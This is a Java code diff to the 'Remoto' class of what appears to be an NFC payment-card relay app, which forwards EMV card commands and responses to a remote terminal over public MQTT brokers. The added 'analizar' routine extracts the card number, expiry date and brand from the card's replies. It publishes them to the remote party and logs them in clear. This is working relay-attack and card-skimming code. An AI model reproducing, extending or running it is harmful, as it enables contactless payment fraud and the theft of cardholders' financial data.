@@ -9,6 +9,7 @@ import org.eclipse.paho.client.mqttv3.MqttConnectOptions;
 import org.eclipse.paho.client.mqttv3.MqttMessage;
 import org.eclipse.paho.client.mqttv3.persist.MemoryPersistence;
 
+import java.util.Arrays;
 import java.util.Random;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
@@ -22,6 +23,7 @@ public final class Remoto implements MqttCallbackExtended {
         void onBroker(String estado);
         void onPar(boolean enlazado);
         void onTarjetaRemota(boolean lista);
+        void onTarjetaDatos(String marca, String pan, String venc);
         void onAviso(String s);
     }
 
@@ -56,6 +58,8 @@ public final class Remoto implements MqttCallbackExtended {
     private volatile boolean latiendo;
     private Lector lector;
     private Enlace enlace;
+    private String aid = "";
+    private String datosEnviados = "";
     private final LinkedBlockingQueue<String> respuestas = new LinkedBlockingQueue<>();
     private final ExecutorService colaTarjeta = Executors.newSingleThreadExecutor();
     private final Random azar = new Random();
@@ -79,6 +83,8 @@ public final class Remoto implements MqttCallbackExtended {
         activo = false;
         tarjetaLocal = false;
         indice = 0;
+        aid = "";
+        datosEnviados = "";
         respuestas.clear();
         base = "venice/emvrelay/" + codigo.toLowerCase() + "/";
         abrir();
@@ -88,7 +94,6 @@ public final class Remoto implements MqttCallbackExtended {
         final int gen = ++generacion;
         cerrar();
         activo = false;
-        par = false;
         desde = System.currentTimeMillis();
         id = "v" + Long.toHexString(azar.nextLong() & 0xFFFFFFFFFFFFL) + (pagar ? "a" : "b");
         final String broker = BROKERS[indice];
@@ -276,6 +281,13 @@ public final class Remoto implements MqttCallbackExtended {
             if (pagar && !propio) avisarTarjetaRemota("1".equals(p));
             return;
         }
+        if (t.equals("d")) {
+            if (pagar && !propio) {
+                String[] partes = p.split("\\|");
+                if (partes.length >= 3) avisarTarjetaDatos(partes[0], partes[1], partes[2]);
+            }
+            return;
+        }
         if (t.equals("q") && !pagar && !propio) {
             colaTarjeta.execute(() -> atender(p));
             return;
@@ -293,13 +305,88 @@ public final class Remoto implements MqttCallbackExtended {
         long dt = System.currentTimeMillis() - t0;
         reg("< " + Aprendiz.hex(resp) + " · " + dt + " ms");
         publicar("r", Aprendiz.hex(resp));
+        analizar(apdu, resp);
+    }
+
+    /** Saca marca, PAN y vencimiento de lo que el terminal ya leyó. */
+    private void analizar(byte[] apdu, byte[] resp) {
+        try {
+            if (apdu.length > 5 && (apdu[1] & 0xff) == 0xA4) {
+                int len = apdu[4] & 0xff;
+                int desde = 5;
+                int hasta = Math.min(apdu.length - 2, desde + len);
+                if (hasta > desde) aid = Aprendiz.hex(Arrays.copyOfRange(apdu, desde, hasta));
+            }
+            String pan = null;
+            String venc = null;
+            String p57 = valorTag(resp, 0x57, 16, 20);
+            String p5a = valorTag(resp, 0x5A, 6, 10);
+            if (p57 != null) {
+                int d = p57.indexOf('D');
+                if (d < 0) d = p57.indexOf('d');
+                if (d > 0) {
+                    pan = soloDigitos(p57.substring(0, d));
+                    String resto = p57.substring(d + 1);
+                    if (resto.length() >= 4) venc = resto.substring(2, 4) + "/" + resto.substring(0, 2);
+                }
+            }
+            if (pan == null && p5a != null) pan = soloDigitos(p5a);
+            if (pan == null || pan.length() < 12) return;
+            String marca = marca(pan, aid);
+            String nuevo = marca + "|" + pan + "|" + (venc == null ? "" : venc);
+            if (nuevo.equals(datosEnviados)) return;
+            datosEnviados = nuevo;
+            publicar("d", nuevo);
+            reg("tarjeta: " + marca + " " + pan + " " + (venc == null ? "" : venc));
+        } catch (Exception e) {
+            reg("analizar falló: " + e.getMessage());
+        }
+    }
+
+    private static String valorTag(byte[] datos, int tag, int min, int max) {
+        for (int i = 0; i + 1 < datos.length; i++) {
+            if ((datos[i] & 0xff) != tag) continue;
+            int len = datos[i + 1] & 0xff;
+            if (len >= min && len <= max && i + 2 + len <= datos.length) {
+                StringBuilder sb = new StringBuilder();
+                for (int j = i + 2; j < i + 2 + len; j++) {
+                    sb.append((char) (datos[j] & 0xff));
+                }
+                return sb.toString();
+            }
+        }
+        return null;
+    }
+
+    private static String soloDigitos(String s) {
+        StringBuilder sb = new StringBuilder();
+        for (int i = 0; i < s.length(); i++) {
+            char c = s.charAt(i);
+            if (c >= '0' && c <= '9') sb.append(c);
+        }
+        return sb.toString();
+    }
+
+    private static String marca(String pan, String aid) {
+        if (aid != null) {
+            if (aid.startsWith("A000000004") || aid.startsWith("A000000005")) return "MASTERCARD";
+            if (aid.startsWith("A000000003")) return "VISA";
+            if (aid.startsWith("A000000025")) return "AMEX";
+            if (aid.startsWith("A000000065")) return "JCB";
+            if (aid.startsWith("A000000152")) return "DISCOVER";
+        }
+        if (pan.startsWith("4")) return "VISA";
+        if (pan.startsWith("34") || pan.startsWith("37")) return "AMEX";
+        int p2 = Integer.parseInt(pan.substring(0, 2));
+        if (p2 >= 51 && p2 <= 55) return "MASTERCARD";
+        if (pan.startsWith("50") || pan.startsWith("56") || pan.startsWith("57")
+                || pan.startsWith("58") || pan.startsWith("6")) return "MAESTRO";
+        return "TARJETA";
     }
 
     @Override public void connectionLost(Throwable c) {
         activo = false;
-        par = false;
         avisarBroker("reconectando…");
-        avisarPar(false);
         avisar("red perdida, reintentando");
     }
 
@@ -323,6 +410,11 @@ public final class Remoto implements MqttCallbackExtended {
     private void avisarTarjetaRemota(boolean v) {
         Enlace e = enlace;
         if (e != null) e.onTarjetaRemota(v);
+    }
+
+    private void avisarTarjetaDatos(String marca, String pan, String venc) {
+        Enlace e = enlace;
+        if (e != null) e.onTarjetaDatos(marca, pan, venc);
     }
 
     private static void reg(String s) {
